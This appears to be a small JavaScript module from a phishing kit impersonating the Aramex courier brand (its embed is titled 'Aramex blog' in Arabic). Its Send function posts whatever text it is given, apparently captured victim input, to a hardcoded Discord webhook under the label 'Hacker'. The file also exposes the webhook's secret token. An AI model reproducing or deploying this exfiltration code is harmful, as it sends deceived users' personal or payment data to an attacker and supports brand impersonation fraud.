import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة اراميكس ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1316469553030631454/yV6c9YgnOkAw_eEzZLfYUTqXBCu-A40IZPTtOseLqAvGuMUuK42l9B95DpCw1N3QDWnQ",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
